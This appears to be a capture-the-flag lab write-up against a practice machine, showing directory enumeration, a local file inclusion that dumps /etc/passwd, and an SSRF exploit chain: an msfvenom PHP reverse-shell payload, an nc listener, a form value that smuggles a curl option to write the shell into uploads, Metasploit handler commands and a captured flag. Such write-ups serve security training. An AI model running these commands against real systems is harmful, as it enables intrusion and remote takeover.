

### Dirb
```bash
==> DIRECTORY: http://10.10.10.24:80/uploads/
```


![[uploads dir forbidden.png]]



### exposed.php

```bash
http://10.10.10.24/exposed.php
```

![[exposed.php.png]]


![[make a post request.png]]


```
http://localhost/test.html
```


![[test site.png]]


### LFI

```txt
file:///etc/passwd
```

```txt
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false maria:x:1000:1000:maria,,,:/home/maria:/bin/bash mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false lightdm:x:111:118:Light Display Manager:/var/lib/lightdm:/bin/false pulse:x:112:121:PulseAudio daemon,,,:/var/run/pulse:/bin/false sshd:x:113:65534::/var/run/sshd:/usr/sbin/nologin
```


### SSRF

reference: *https://resources.infosecinstitute.com/topic/the-ssrf-vulnerability/*


Generate a reverse shell payload:

```bash
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.3 lport=4321 -f raw -o shell.php
```

Start a simple http server:

```python
python3 -m http.server 80
```

Start a netcat listener:

```
nc -lvnp 4321 
```

Edit form request in burpsuite:


![[Edit form request in burpsuite.png]]


```txt
formurl=http://10.10.14.3/shell.php -o uploads/shell.php&submit=Go
```

we get a request on the attacker web server:

![[request on the attacker web server.png]]

visit the url to execute the reverse shell:
```txt
http://10.10.10.24/uploads/shell.php
```


in metasploit console:
```txt
use exploit/multi/handler 
set payload php/meterpreter/reverse_tcp
set lhost 10.10.14.3
set lport 4321
run
```


we get a shell:

![[pop shell.png]]

local.txt:

```txt
6316ebf1106bb844ca5039e5c44acf96
```

![[local.txt.png]]

